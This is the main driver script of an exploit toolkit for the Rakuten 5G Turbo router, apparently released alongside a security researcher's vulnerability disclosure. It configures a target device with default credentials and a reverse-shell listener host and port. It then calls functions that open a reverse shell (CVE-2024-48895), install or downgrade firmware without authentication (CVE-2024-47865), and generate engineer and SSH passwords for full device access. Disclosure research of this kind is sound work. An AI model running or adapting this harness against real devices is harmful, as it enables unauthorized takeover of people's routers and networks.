# main.py
# @package   5GturboAPI
# @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
# @license   Proprietary License - All Rights Reserved
# @docs      https://neroteam.com/blog/rakuten-5g-turbo-vulnerability

import turboApi

device = {
    "turboIp": "192.168.210.1", # Device IP
    "turboUsername": "admin", # Device username
    "turboPassword": "admin", # Device password
    "host": "192.168.210.157", # Used for reverse shell
    "port": "33666", # Used for reverse shell
    "apn": "rakuten.jp", # Set new APN
    "fwImage": "GA2421@230920_1.3.14.ffw", # CVE-2024-47865
}

# http://http-fota.rakuten.smartgaiacloud.com/fw/

"""
Get Device info.
"""
response = turboApi.getDeviceVersion(device)
print(response)

"""
Execute reverse shell on version 1.3.18 and under (turboUsername/turboPassword required) - CVE-2024-48895
"""
# response = turboApi.execRevrsShell(device)
# print(response)

"""
Install/Downgrade firmware image - No auth required - CVE-2024-47865
"""
# response = turboApi.execInstallFw(device)
# print(response)

"""
BONUS! Generate Engineer Password to get full web access
"""
# response = turboApi.getEngineerPassword(device)
# print(response)

"""
BONUS! Generate SSH Password to get SSH access, only working by installing debug firmware (e.g. DG2425@2406171559_DG1.3.18.ffw)
"""
# response = turboApi.getSshPassword(device)
# print(response)

"""
BONUS! Direclty set new APN from API (can also work with Engineer access)
"""
# response = turboApi.setDeviceApn(device)
# print(response)
